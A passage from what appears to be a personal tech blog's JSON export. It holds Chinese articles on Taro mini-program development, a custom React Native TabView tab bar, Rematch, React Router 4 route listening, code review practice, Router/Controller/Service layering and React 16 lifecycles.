技术栈开发小程序","date":"2018-09-02T03:59:04.000Z","updated":"2021-06-15T06:10:52.912Z","comments":true,"path":"/stories/2018/09/小程序/使用 React 技术栈开发小程序/","link":"","permalink":"http://me.lizhooh.com/stories/2018/09/小程序/使用 React 技术栈开发小程序/","excerpt":"前言小程序是微信推出的一个应用架构，其架构采用的是类似 Vue 的模版语法，却又不是响应式更新。总的来说，就是 Vue 的 Template + React 的 setState 结构，正因为这样暴露了小程序自身的抽象能力不足以及组件化的思想不完善，导致很多开发体验上的不爽，从而催生了社区的使用纯 Vue 或纯 React 的技术栈开发小程序应用的想法。 为了抹去这些差异以及跨域的学习成本，有几个前端的开发团队陆续的推出了编译型的使用 React 开发小程序的框架，例如：京东凹凸实验室的 Taro，去哪儿的 Anu 等。","text":"前言小程序是微信推出的一个应用架构，其架构采用的是类似 Vue 的模版语法，却又不是响应式更新。总的来说，就是 Vue 的 Template + React 的 setState 结构，正因为这样暴露了小程序自身的抽象能力不足以及组件化的思想不完善，导致很多开发体验上的不爽，从而催生了社区的使用纯 Vue 或纯 React 的技术栈开发小程序应用的想法。 为了抹去这些差异以及跨域的学习成本，有几个前端的开发团队陆续的推出了编译型的使用 React 开发小程序的框架，例如：京东凹凸实验室的 Taro，去哪儿的 Anu 等。 这些使用 React 技术栈开发小程序的核心原理基本一致，利用 JSX 的灵活性以及 Nodejs，在开发阶段进行实时的编译（代码转换，实际上是字符串处理），编译成原生的小程序代码。因为小程序的代码会分为三个文件：index.js，index.wxss，index.wxml。并且分为 page 页和 component 组件两个类型，根据这些特点很容易的通过 jsx 去构造。 使用 React 技术栈的会有以下的好处： 统一的技术栈，灵活的 JSX 语法，带来开发上的灵活控制。 小程序有着类型 React Native 的组件，统一的技术栈能带来开发上的便捷迁移。 基于 React 可以配置 Redux/Mobx 做数据状态上的集中管理。 ES6+，模块化的支持，真正意义上的组件化编程。 无额外的新语法学习成本。 Less/Sass 甚至是 styled-components 的支持，带来的一致的开发体验。 TaroTaro 是京东凹凸实验室开源的一个跨三端的开发框架，官方说明是尽量的使用同样的代码能够在 H5，小程序，React Native 上进行三端的部署。 这个目标很伟大，同时实现起来很艰难。主要表现为：H5、小程序、React Native 之间是不同的架构体系以及 API，这部分需要做很多的适配工作去抹去这些差异性。其次是 H5、小程序、React Native 的技术不断发展，API 不断更新，维护成本也比较高。另外，有一些比较难实现的组件，Taro 当前选择的是不支持。例如 Video 组件只支持 H5，小程序。另外在样式方面也很难统一，小程序的样式只支持部分的 CSS 内容，而 React Native 的样式只能对每个组件进行声明式样式，不能使用选择器等。 总之，跨三端适配的想法是非常前沿的，但是现实总是很残酷，要做到 100% 的跨三端适配几乎不可能，如果舍其部分内容，实现跨三端适配还是有可能的。 但是唯一一点是可以保证的，那就是正如 React 官方所说的一样：Learn Once, Write Anywhere。 基于使用安装模块以及创建项目。 123npm install -g @tarojs/clitaro init myApp 之后就是中规中矩的开发。 常用的组件有 &lt;View&gt;，&lt;Text&gt;，&lt;Button&gt; 等这些组件都是从小程序的组件里映射的，基本的 props 与原生的相同。 其外，Taro 只支持一个文件一个组件类的写法，如果一个文件有两个组件，着有一个不起作用。例如： 12345678910111213141516171819class MyText extends Component &#123; render() &#123; return ( &lt;Text&gt; &#123;this.props.title&#125; &lt;/Text&gt; ); &#125;&#125;export default class Home extends Page &#123; render() &#123; return ( &lt;View&gt; &lt;MyText title='abc' /&gt; &lt;/View&gt; ); &#125;&#125; 这样写 &lt;MyText&gt; 是无效的，也不会把 abc 渲染在子节点上，这时请把 MyText 搬到另外单独的文件里，并且文件名与导出的类名一致。 其次是 Taro 不支持 JSX 匿名回调函数的写法，需要绑定参数时，这时请使用 bind 绑定参数。例如： 123456789101112131415export default class Home extends Page &#123; render() &#123; const &#123; list = [] &#125; = this.props; return ( &lt;View&gt; &#123;list.map((item, index) =&gt; ( &lt;Item onTap=&#123;e =&gt; &#123; // ... item, index &#125;&#125; /&gt; ))&#125; &lt;/View&gt; ); &#125;&#125; 任何在 JSX 里的匿名函数，需要绑定参数时，请使用 bind。 123456789101112131415161718export default class Home extends Page &#123; onTap(item, index) &#123; // ... &#125; render() &#123; const &#123; list = [] &#125; = this.props; return ( &lt;View&gt; &#123;list.map((item, index) =&gt; ( &lt;Item onTap=&#123;this.onTap.bind(this, item, index)&#125; /&gt; ))&#125; &lt;/View&gt; ); &#125;&#125; 其他模块支持 redux: @tarojs/redux router: @tarojs/router async: @tarojs/async-await 使用 Redux下面介绍，如何在 Taro 里使用 Redux，且使用 Redux-Fine。 首先安装 redux 相关的： 1yarn add redux @tarojs/redux redux-fine @tarojs/redux 充当着 react-redux 的角色，所以基本的。 12import &#123; Provider &#125; from '@tarojs/redux';import &#123; connect &#125; from '@tarojs/redux'; 只是 connect 有点稍稍的不同。 在 tarojs/redux 的 connect 只有一种参数形式。 connect 方法接受两个参数 mapStateToProps 与 mapDispatchToProps： mapStateToProps，函数类型，接受最新的 state 作为参数，用于将 state 映射到组件的 props。 mapDispatchToProps，函数类型，接收 dispatch() 方法并返回期望注入到展示组件的 props 中的回调方法。 123456789101112131415161718192021const actions = &#123; add() &#123; return &#123; type: 'xxx' &#125;; &#125;, asyncAdd: () =&gt; (dispatch) =&gt; &#123; return &#123; type: 'xxx' &#125;; &#125;&#125;export default connect( state =&gt; (&#123; state: state.index &#125;), dispatch =&gt; (&#123; add() &#123; dispatch(actions.add()); &#125; asyncAdd() &#123; dispatch(actions.asyncAdd()); &#125; &#125;),)(Index); 不同的是第二个参数只支持传递 dispatch 的形式，所以这里需要自己做一下适配。 其他的 reducer、store、action 与 redux 的写法一样。 接下来使用 Redux-Fine，Redux-Fine 是我自己写的一个上层的框架，主要是为精简 Redux 的代码而出现的。 先创建一下的目录： 1234- src/redux - index.js - module - index.js 在 src/redux/index.js 里是初始化代码，非常简单，第一步初始化模块，完成后调用 store 函数即可返回一个 store。 123456789101112131415// src/redux/index.jsimport Fine from 'redux-fine';import IndexModule from './module/index';Fine.module('index', IndexModule);export default Fine.store();/*import store from './redux';&lt;Provider store=&#123;store&#125;&gt;&lt;/Provider&gt;*/ 接着，创建一个 Module。 123456789101112// src/redux/module/index.jsimport Fine from 'redux-fine';export default class IndexModule extends Fine.Module &#123; initState = &#123; color: '#39f', &#125; updateColor = (color) =&gt; &#123; // 发起一个数据的改变 this.commit(state =&gt; (&#123; ...state, color &#125;)); &#125;&#125; 小结除了 Taro 外，还可以使用 Anu，这里就不介绍了，总体来说大同小异。 Taro 的想法非常好，通过使用 React 的技术栈，能够让你开发小程序应用，同时开发者可用无需学习微信小程序的语法即可进行开发。 这样的技术是全新的，跨时代的，最终都会往完全的跨三端适配的路线发展。","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"React Native TabView 自定义","slug":"React Native/React Native TabView 自定义","date":"2018-08-25T05:13:44.000Z","updated":"2021-06-15T06:10:52.859Z","comments":true,"path":"/stories/2018/08/React Native/React Native TabView 自定义/","link":"","permalink":"http://me.lizhooh.com/stories/2018/08/React Native/React Native TabView 自定义/","excerpt":"前言关于 Tabbar 的第三方组件有非常多，今天使用的一个是 React Native Components 组织提供的一个基于 Animated Api 编写的 TabsView 组件，有着不错的使用体验，相比之前的 Tabs 组件更加灵活。 本文，介绍如何基于业务的特点来自定义 Tabbar。","text":"前言关于 Tabbar 的第三方组件有非常多，今天使用的一个是 React Native Components 组织提供的一个基于 Animated Api 编写的 TabsView 组件，有着不错的使用体验，相比之前的 Tabs 组件更加灵活。 本文，介绍如何基于业务的特点来自定义 Tabbar。 TabsView使用的是 react-native-tab-view，它有以下特点： 平滑的动画和手势。 可滚动标签。 支持顶部和底部标签栏。 遵循 Material Design 规范。 高度可定制。 与其他 Tabs 组件不同的是，此组件的状态是通过外部来维护的，这意味给予了开发者很多的灵活性与扩展性。 123456789101112131415161718192021222324252627282930313233343536import * as React from 'react';import &#123; View, StyleSheet, Dimensions &#125; from 'react-native';import &#123; TabView, TabBar, SceneMap &#125; from 'react-native-tab-view';const w = Dimensions.get('window');const FirstRoute = () =&gt; ( &lt;View style=&#123;&#123; flex: 1, backgroundColor: '#ff4081' &#125;&#125; /&gt;);const SecondRoute = () =&gt; ( &lt;View style=&#123;&#123; flex: 1, backgroundColor: '#673ab7' &#125;&#125; /&gt;);export default class TabViewExample extends React.Component &#123; state = &#123; index: 0, routes: [ &#123; key: 'first', title: 'First' &#125;, &#123; key: 'second', title: 'Second' &#125;, ], &#125;; render() &#123; return ( &lt;TabView navigationState=&#123;this.state&#125; renderScene=&#123;SceneMap(&#123; first: FirstRoute, second: SecondRoute, &#125;)&#125; onIndexChange=&#123;index =&gt; this.setState(&#123; index &#125;)&#125; initialLayout=&#123;&#123; width: w.width &#125;&#125; /&gt; ); &#125;&#125; 自定义 Tabbar在默认的情况下，提供的 TabBar 是 Material Design 风格的颜色，实际上我们都不用，基本都需要自定义。 在 TabView 里有一个 renderTabBar 的函数用于选择 TabBar，自定义就从这部分开始。 123456renderTabBar=&#123;(&#123; navigationState, position&#125;) =&gt; &#123; // ...&#125;&#125; 提供了两个 props：navigationState 和 position。 position 是一个 Animated 对象。现在，为文字添加在滑动时变化的效果。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546export default (&#123; navigationState, position, theme = '#444', width = w.width, // tabbar 宽度 height = 35, // tabbar 宽度&#125;) =&gt; &#123; const num = navigationState.routes.length; const inputRange = navigationState.routes.map((x, i) =&gt; i); return ( &lt;View style=&#123;[styles.row, &#123; height &#125;]&#125;&gt; &#123;navigationState.routes.map((route, i) =&gt; &#123; const color = position.interpolate(&#123; inputRange, outputRange: inputRange.map( // index 匹配时激活颜色 inputIndex =&gt; inputIndex === i ? theme : 'rgba(1, 1, 1, 0.45)' ), &#125;); return ( &lt;Touch key=&#123;i&#125; style=&#123;styles.touch&#125; activeOpacity=&#123;0.8&#125; onPress=&#123;() =&gt; &#123; onChange(i); &#125;&#125;&gt; &lt;Animated.Text style=&#123;&#123; color &#125;&#125;&gt; &#123;route.title&#125; &lt;/Animated.Text&gt; &lt;/Touch&gt; ); &#125;)&#125; &lt;/View&gt; )&#125;const styles = StyleSheet.create(&#123; row: &#123; flexDirection: 'row', backgroundColor: '#fff', alignItems: 'center', &#125;,&#125;); 非常简单，通过 Animated.Text 实现文字颜色变化的动画效果。其他都是中规中矩的组件布局。 接下来为 TabBar 的按钮提供一条线，来更加充分的展示 TabBar 激活时的效果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869export default (&#123; navigationState, position, theme = '#444', width = w.width, // tabbar 宽度 height = 35, // tabbar 宽度 lineWidth = 55, // 线条宽度 lineHeight = 2, // 线条高度 onChange = _ =&gt; _ // 改变是触发&#125;) =&gt; &#123; const num = navigationState.routes.length; const inputRange = navigationState.routes.map((x, i) =&gt; i); const outputRange = navigationState.routes.map((x, i) =&gt; width * (i / num)); return ( &lt;View&gt; &lt;View style=&#123;[styles.row, &#123; height &#125;]&#125;&gt; &#123;navigationState.routes.map((route, i) =&gt; &#123; const color = position.interpolate(&#123; inputRange, outputRange: inputRange.map( inputIndex =&gt; inputIndex === i ? theme : 'rgba(1, 1, 1, 0.45)' ), &#125;); return ( &lt;Touch key=&#123;i&#125; style=&#123;styles.touch&#125; activeOpacity=&#123;0.8&#125; onPress=&#123;() =&gt; &#123; this.animate(0); onChange(i); &#125;&#125;&gt; &lt;Animated.Text style=&#123;&#123; color &#125;&#125;&gt; &#123;route.title&#125; &lt;/Animated.Text&gt; &lt;/Touch&gt; ); &#125;)&#125; &lt;/View&gt; &lt;Animated.View style=&#123;&#123; height: lineHeight, width: lineWidth, marginLeft: width / (num * 2) - lineWidth / 2, backgroundColor: theme, transform: [&#123; translateX: position.interpolate(&#123; inputRange, outputRange, &#125;), &#125;], &#125;&#125; /&gt; &lt;/View&gt; );&#125;const styles = StyleSheet.create(&#123; row: &#123; flexDirection: 'row', backgroundColor: '#fff', alignItems: 'center', &#125;, touch: &#123; flex: 1, alignItems: 'center', paddingVertical: 8, &#125;&#125;); 做法是在布局里添加一个 Animated.View 用于显示线条的效果，通过动态的插值计算，计算出线条的位置，以及变化的位置。 小结好了，到这里自定义 TabBar 完成，主要是根据 navigationState 和 position 提供的信息来缺点变现的形式。 注意在 v0.59+ 以上 react-native-tab-view 的 API 改了，需要安装以下模块： 1yarn add react-native-reanimated react-native-gesture-handler 并且 Animated 的引用发生了变化，改成从 react-native-reanimated 里引入： 12- import &#123; Animated &#125; from 'react-native';+ import &#123; Animated &#125; from 'react-native-reanimated'; 一些函数有点变化，之前的是： 1234position.interpolate(&#123; inputRange, outputRange,&#125;); 现在的是： 1234Animated.interpolate(position, &#123; inputRange, outputRange,&#125;); 有一个改动比较大的就是 position 需要自己提供，也就是 renderTabBar 参数的 position 需自己提供（旧的方式不需要自己指定）： 123456renderTabBar=&#123;(&#123; navigationState, position&#125;) =&gt; &#123; // ...&#125;&#125; 改成： 12345678910import &#123; Animated &#125; from 'react-native-reanimated';const [position] = useState(() =&gt; new Animated.Value(0));return ( &lt;TabView position=&#123;position&#125; ... /&gt;);","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Rematch 的使用指南","slug":"Redux/Rematch 的使用指南","date":"2018-08-19T09:27:14.000Z","updated":"2021-06-15T06:10:52.892Z","comments":true,"path":"/stories/2018/08/Redux/Rematch 的使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2018/08/Redux/Rematch 的使用指南/","excerpt":"前言今天发现一个 Redux 的框架：Rematch。形式与我写的 Redux-Fine 差不多，都是提供一键创建 Stroe 等便捷的函数。在 Rematch 里也同样没有 Action，Type，Thunk 等。 中文文档：https://rematch.gitbook.io/handbook","text":"前言今天发现一个 Redux 的框架：Rematch。形式与我写的 Redux-Fine 差不多，都是提供一键创建 Stroe 等便捷的函数。在 Rematch 里也同样没有 Action，Type，Thunk 等。 中文文档：https://rematch.gitbook.io/handbook 基本使用安装：1yarn add @rematch/core 首先，有以下的目录结构。 1234567- src - redux - models - index.js - index.js - app.js - index.js 在 src/index.js 里是创建 React 实例。从 redux/index.js 获取到 store 给 Provider。 12345678910111213// src/index.jsimport React from 'react';import ReactDOM from 'react-dom';import App from './app';import &#123; Provider &#125; from 'react-redux';import store from './redux';ReactDOM.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById('root')); 在 redux/index.js 里主要是创建 Stroe。 1234567891011// src/redux/index.jsimport &#123; init &#125; from '@rematch/core';import IndexModel from './models/index';// 返回一个创建好的 Storeexport default init(&#123; models: &#123; // 逻辑模块 index: IndexModel, &#125;,&#125;); 在 src/models/index.js 里定义模型。这个模型的属性是带有约束力的，固定的。 12345678910111213141516171819// src/models/index.jsexport default &#123; // 初始的数据 state: &#123; count: 0, &#125;, // 数据处理 reducers: &#123; increment(state, n) &#123; return &#123; count: state.count + n&#125;; &#125; &#125;, effects: (dispatch) =&gt; (&#123; async incrementAsync(n, rootState) &#123; await new Promise(resolve =&gt; setTimeout(resolve, 1000)); dispatch.index.increment(n); &#125;, &#125;),&#125;; 或者也可以写成这样： 12345678910111213141516export const state = &#123; count: 0,&#125;;export const reducers = &#123; increment(state, n) &#123; return &#123; count: state.count + n &#125;; &#125;,&#125;;export const effects = dispatch =&gt; (&#123; async incrementAsync(n) &#123; await new Promise(resolve =&gt; setTimeout(resolve, 1000)); dispatch.index.increment(n); &#125;,&#125;); 注意引入时需要加上 * 号： 1import * as IndexModel from './models/index'; dispatch 也可以通过全局的方式引入： 1import &#123; init, dispatch &#125; from '@rematch/core'; 在 src/app.js 里就是连接视图。 1234567891011121314151617181920212223import React, &#123; Component &#125; from 'react';import &#123; connect &#125; from 'react-redux';export default connect( state =&gt; (&#123; state: state.index &#125;), // state state =&gt; (&#123; ...state.index &#125;), // action)(class extends Component &#123; render() &#123; console.log(this.props.state); console.log(this.props); const &#123; count &#125; = this.props.state; const &#123; increment, incrementAsync &#125; = this.props; return ( &lt;div&gt; &lt;h1&gt;Home&lt;/h1&gt; &lt;h2&gt;&#123;count&#125;&lt;/h2&gt; &lt;button onClick=&#123;e =&gt; increment(1)&#125;&gt;增加&lt;/button&gt; &lt;button onClick=&#123;e =&gt; incrementAsync(1)&#125;&gt;增加【异步】&lt;/button&gt; &lt;/div&gt; ); &#125;&#125;); 当点击按钮时，会调用 increment，直接映射到 models.index 的 reducers 里的 increment。reducers 的第一个参数是注入的，第二个参数开始才是自己设定的。 在 increment 里处理数据的变化，返回的值就是新的 state。 API models - 定义模型。 state - 初始的数据也是变化的数据。 reducers - 处理数据变化的地方，返回值是新的 state，函数的参数为：(state, payload)。 effects - 是一个回调函数，参数是 dispatch，返回的对象属性为函数，参数是 (payload, rootState)。一般用于处理异步的情况。 basereducer - 最原始的 reducers，参数是 (state, action) =&gt; state。 init(opt) - 启动初始化，返回一个创建好的 Store。 state定义 modal 的数据。 reducers定义数据的改变，只能是纯函数，同步函数。 effects定义异步的数据变化，带有副作用的可以在里面调用跨 modal 的 reducers。","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"解决 React Router 4 不支持监听路由功能","slug":"React/Router/解决 React Router 4 不支持监听路由功能","date":"2018-08-19T05:37:13.000Z","updated":"2021-06-15T06:10:52.884Z","comments":true,"path":"/stories/2018/08/React/Router/解决 React Router 4 不支持监听路由功能/","link":"","permalink":"http://me.lizhooh.com/stories/2018/08/React/Router/解决 React Router 4 不支持监听路由功能/","excerpt":"前言使用 React Router 4 都知道，在 4 版本里没有事件系统，想要在路由里监听路由的改变也是一件非常困难的事情，现在查了好久资料终于查到了解决方案。 Issues首先，第一步是去 Issues 里，搜索问题。输入的关键字是 listen。 刚好找到了有一个人也问如何监听路由的改变的问题。","text":"前言使用 React Router 4 都知道，在 4 版本里没有事件系统，想要在路由里监听路由的改变也是一件非常困难的事情，现在查了好久资料终于查到了解决方案。 Issues首先，第一步是去 Issues 里，搜索问题。输入的关键字是 listen。 刚好找到了有一个人也问如何监听路由的改变的问题。 https://github.com/ReactTraining/react-router/issues/5364 接着有一个维护者说到： 大致的意思是，他写了一个 OnUpdate 支持这个功能，好吧。 解决问题123import &#123; OnUpdate &#125; from 'rrc'&lt;OnUpdate call=&#123;location =&gt; console.log(location)&#125; /&gt; OnUpdate 可以放置在任何地方，因为它只是一个形式的存在。 得到的 location 是一个对象： 1234567&#123; hash: \"\", key: \"nrgmvj\" pathname: \"/star\", search: \"\", state: undefined,&#125; 使用 Link，点击浏览器的回退按钮，使用 location.go 等，只要是改变了 url 都会触发 call 回调函数。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"React-Router","slug":"React-Router","permalink":"http://me.lizhooh.com/tags/React-Router/"}]},{"title":"代码审查（Code Review）的建议","slug":"后端/代码审查（Code Review）的建议","date":"2018-08-18T13:25:11.000Z","updated":"2021-06-15T06:10:52.910Z","comments":true,"path":"/stories/2018/08/后端/代码审查（Code Review）的建议/","link":"","permalink":"http://me.lizhooh.com/stories/2018/08/后端/代码审查（Code Review）的建议/","excerpt":"前言代码审查是一个可缺有不可缺的东西。代码评审也称代码复查，是指通过阅读代码来检查源代码与编码标准的符合性以及代码质量的活动。 对于自己写的代码，会潜在地产生一种信任和依赖，所以自己有时候是很难发现其中的明显的错误以及规范问题的。然而，对于其他人来说，一开始是不会进入这种 “自我信任” 状态的，所以较容易发现问题。Code Review 就创造了这个机会，以第二双眼睛再次检查代码，帮助我们及时地发现潜在的问题。","text":"前言代码审查是一个可缺有不可缺的东西。代码评审也称代码复查，是指通过阅读代码来检查源代码与编码标准的符合性以及代码质量的活动。 对于自己写的代码，会潜在地产生一种信任和依赖，所以自己有时候是很难发现其中的明显的错误以及规范问题的。然而，对于其他人来说，一开始是不会进入这种 “自我信任” 状态的，所以较容易发现问题。Code Review 就创造了这个机会，以第二双眼睛再次检查代码，帮助我们及时地发现潜在的问题。 目标代码评审不是批斗会，不能以缺陷和错误来打击开发人员的积极性，评审的最终目标是提高系统质量及团队成员整体水平。 评审标准：代码编写是否规范、高效、简洁、健壮、可读性强。 总的来说，就是： 提高软件整体质量，提升系统的可维护性。 及早发现潜在缺陷与 BUG，降低事故成本。 促进团队内部知识共享，提高团队整体水平。 评审过程对于评审人员来说，也是一种思路重构的过程，可以帮助更多的人理解系统。 交叉审查代码，类似于结对编程，彼此都能熟悉对方模块业务，降低因人员流失的运营成本及风险。 不过，代码审查并不是强制性的： 代码审查建议每半月一次或一月一次，审查追求的是质量而不是数量。 不要过分要求程序员做代码审查。如果你强迫他们每天做一小时的代码审查，他们很快就会痛恨它。 不要把它当成一种无趣的任务。代码审查是针对代码，不是针对人。代码审查是一种学习，是表扬，是获得反馈。 是一种十分社交性的活动。代码审查应该是有趣的，不要让它变的无聊。 常规项代码审查的常规项，包括了以下几个方面。 代码能否正常工作？有没有实现预期的功能，逻辑是否正确？ 所有的代码是否简洁易懂？ 代码是否遵循既定的编码规范？包括但不局限于大括号的位置，变量名和函数名，行的长度，缩进，格式和注释。 是否存在多余的或是多次重复的代码？ 代码是否尽可能的模块化了？ 是否有可以被替换的全局变量？ 是否有同一变量多次被赋予不同含义的值，容易使人理解错误？ 是否有被注释掉的代码？僵尸代码？ 循环是否设置了长度和正确的终止条件？ 是否有可以被库函数替代的代码？ 是否有可以删除的日志或调试代码？ 安全项安全的审查事关重要，以下是推荐的审查项。 所有的数据输入是否都进行了安全检查（检测正确的类型，长度，格式和范围）并且进行了编码？ 在哪里使用了第三方依赖或服务，返回的错误是否被捕获？ 输出的值是否进行了检查并且编码？ 无效的参数值是否能够处理？ 防止未授权的访问。 防止漏洞注入。 避免硬编码敏感数据。 去掉注释中的死代码。 防止 CSRF、XSS 恶意攻击。 关键点 最近一次迭代开发的代码。 系统关键模块。 业务较复杂的模块。 缺陷率较高的模块。","categories":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/categories/后端/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"}]},{"title":"谈谈 Router、Controller、Service","slug":"后端/谈谈 Router、Controller、Service","date":"2018-08-11T15:08:04.000Z","updated":"2021-06-15T06:10:52.911Z","comments":true,"path":"/stories/2018/08/后端/谈谈 Router、Controller、Service/","link":"","permalink":"http://me.lizhooh.com/stories/2018/08/后端/谈谈 Router、Controller、Service/","excerpt":"前言在传统的后端开发里，有典型的架构，那就是 MVC 结构。MVC 讲究的是视图与逻辑分离，由控制器控制视图的结果。而到了现在，这种结构逐渐薄弱，演变为 MVP，甚至是只有 MV 的结构。在前端 SPA 应用架构里，更多的遵循 MVVM（双向的数据绑定），这种结构的好处是能够把视图与数据分离，但又能做到视图与数据关联。 今天来谈谈后端里几个重要的概念：Router、Controller、Service，以及它们的责任体系。","text":"前言在传统的后端开发里，有典型的架构，那就是 MVC 结构。MVC 讲究的是视图与逻辑分离，由控制器控制视图的结果。而到了现在，这种结构逐渐薄弱，演变为 MVP，甚至是只有 MV 的结构。在前端 SPA 应用架构里，更多的遵循 MVVM（双向的数据绑定），这种结构的好处是能够把视图与数据分离，但又能做到视图与数据关联。 今天来谈谈后端里几个重要的概念：Router、Controller、Service，以及它们的责任体系。 RouterRouter 是后端里面最常见的概念，Router 主要用来描述请求 URL 和具体承担执行动作的 Controller 的对应关系。一个 Router 代表着一个 URL 接收方式，而在 Router 里如何处理逻辑，则由 Controller 来负责。 例如，下面的 router 就是接收 /user 的请求，在回调函数里处理逻辑。也就是说，可以认为 router 的回调函数就是 Controller。 1234// koa routerrouter.get('/user', ctx =&gt; &#123; // ...&#125;); 通常路由的规则都是统一的集中式管理，定义在同一个文件下。当有很多路由层级时，可以考虑多级的目录文件定义路由规则，但是为了能够方便管理与查看，通常都是集中在一个文件里定义。 Controller在前面，介绍了 Router 将用户的请求基于 method 和 URL 分发到了对应的 Controller 上，那 Controller 负责做什么？ 简单的说 Controller 负责解析用户的输入，处理后返回相应的结果。它主要有以下的表现： 在 RESTful 接口中，Controller 接受用户的参数，从数据库中查找内容返回给用户或者将用户的请求更新到数据库中，并做数据处理。 在 HTML 页面请求中，Controller 根据用户访问不同的 URL，渲染不同的模板得到 HTML 返回给用户。 在代理服务器中，Controller 将用户的请求转发到其他服务器上，并将其他服务器的处理结果返回给用户。 在 Controller 里通常不会涉及太多的业务代码，Controller 层主要对用户的请求参数进行处理（校验、转换），之后的交给对应的 Service 方法处理业务。 Controller 的处理过程如下： 获取用户通过 HTTP 传递过来的请求参数。 校验、组装参数。 调用 Service 进行业务处理，必要时处理转换 Service 的返回结果，让它适应用户的需求。 通过 HTTP 将结果响应给用户。 注意了，controller 指的是一类行为，一个路由可以对应一个 controller，也可以是一个路由对应着一个 controller 的方法。 ServiceService 就是在复杂业务场景下用于做业务逻辑封装的一个抽象层。这种抽象层，有什么好处呢？把所有业务代码写在 Controller 里不行吗？ 简单点说，提供这个 Service 抽象有以下几个好处： 保持 Controller 中的逻辑更加简洁。 保持业务逻辑的独立性，抽象出来的 Service 可以被多个 Controller 重复调用。 将逻辑和展现分离，更容易编写测试用例。 业务需求变化大，把业务代码做一个抽象，能够使系统更健壮。 能够更容易的切分模块开发。 是可以把所有的业务代码写在 Controller 里的。但是这样面临一个问题，不好测试，为什么？ 下面的代码，只有 Router 和 Controller，当尝试单独的测试 Controller 的时候，你会发现，它需要 ctx、next 这样的参数，而这些参数巧好是运行时的路由提供的 http 上下文参数。 1234567891011121314151617// controllerconst controller = &#123; async index(ctx, next) &#123; const &#123; id &#125; = ctx.params; const &#123; limit, offset &#125; = ctx.query; // 这是业务代码，这里只是简单的查询 const res = await db.user.find(( _id: id )).limit(limit).skip(offset); ctx.body = &#123; status: 200, result: res, &#125;; &#125;&#125;// routerrouter.get('/user', controller.index); 当使用 Jest 等单元测试框架测试时，就显得非常难测试业务代码。 如果，现在把业务代码抽象到一个 Service 里。 123456789101112131415161718192021222324// serviceconst service = &#123; index(id, limit = 20, offset = 0) &#123; result db.user.find(( _id: id )).limit(limit).skip(offset); &#125;&#125;// controllerconst controller = &#123; async index(ctx, next) &#123; const &#123; id &#125; = ctx.params; const &#123; limit, offset &#125; = ctx.query; // 业务代码抽象层 const res = await service.index(id, limit, offset); ctx.body = &#123; status: 200, result: res, &#125;; &#125;&#125;// routerrouter.get('/user', controller.index); 需要单元测试时，只需要测试 service.index 即可，当业务变化时，也只需要修改 service.index 即可，这样非常方便与可维护。 小结Router、Controller、Service 的关系并不复杂，除此外还有 View，Model 等设计层。 它们的关系如下：","categories":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/categories/后端/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"}]},{"title":"深入浅出 React 16+ 新的生命周期","slug":"React/React/深入浅出 React 16+ 新的生命周期","date":"2018-08-10T06:16:49.000Z","updated":"2021-06-15T06:10:52.880Z","comments":true,"path":"/stories/2018/08/React/React/深入浅出 React 16+ 新的生命周期/","link":"","permalink":"http://me.lizhooh.com/stories/2018/08/React/React/深入浅出 React 16+ 新的生命周期/","excerpt":"前言React 在 16 版本之后推出了新的渲染引擎（Fiber），随之而来的就是生命周期函数的改变。当然，这个更替是缓慢的，在整个 16 版本里都能无障碍的使用旧的三生命周期，但值得注意的是，旧的生命周期（unsafe）不能和新的生命周期同时出现在一个组件，否则会报错”你使用了一个不安全的生命周期”。","text":"前言React 在 16 版本之后推出了新的渲染引擎（Fiber），随之而来的就是生命周期函数的改变。当然，这个更替是缓慢的，在整个 16 版本里都能无障碍的使用旧的三生命周期，但值得注意的是，旧的生命周期（unsafe）不能和新的生命周期同时出现在一个组件，否则会报错”你使用了一个不安全的生命周期”。 在 React 15 里有三个明显的生命周期函数： componentWillMount componentWillReceiveProps componentWillUpdate 这三个生命周期函数在 React 16 之后被取消，从而取代的是两个生命周期函数。 static getDerivedStateFromProps getSnapshotBeforeUpdate 为什么要改旧的生命周期十分完整，基本可以捕捉到组件更新的每一个 state/props/ref，没有什从逻辑上的毛病。 但是架不住官方自己搞事情，react 打算在17版本推出新的 Async Rendering，提出一种可被打断的生命周期，而可以被打断的阶段正是实际 dom 挂载之前的虚拟 dom 构建阶段，也就是要被去掉的三个生命周期。 生命周期一旦被打断，下次恢复的时候又会再跑一次之前的生命周期，因此 componentWillMount，componentWillReceiveProps， componentWillUpdate 都不能保证只在挂载/拿到 props 状态变化的时候刷新一次了，所以这三个方法被标记为不安全。 两个新生命周期static getDerivedStateFromProps：触发时间：在组件构建之后(虚拟 dom 之后，实际 dom 